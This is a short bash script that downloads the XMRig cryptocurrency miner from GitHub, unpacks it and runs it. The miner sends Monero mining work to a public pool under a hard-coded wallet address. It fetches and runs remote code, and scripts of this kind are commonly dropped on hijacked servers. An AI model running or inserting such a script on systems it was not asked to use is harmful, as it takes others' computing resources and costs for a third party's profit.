#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.2.3/xmrig-6.2.3-xenial-x64.tar.gz
tar xfvz xmrig-6.2.3-xenial-x64.tar.gz
cd xmrig-6.2.3
./xmrig --donate-level 1 -o pool.supportxmr.com:9000 -u 83gi91MmJVgMxBLLjw7C2U9NaZXmLCsQh85hBbx4qgQR629aozXUi1vPZiiRgpx2jLDoskMVYMA7BWyVPkeAN7eGV5d6MnS --rig-id csd -k --tls
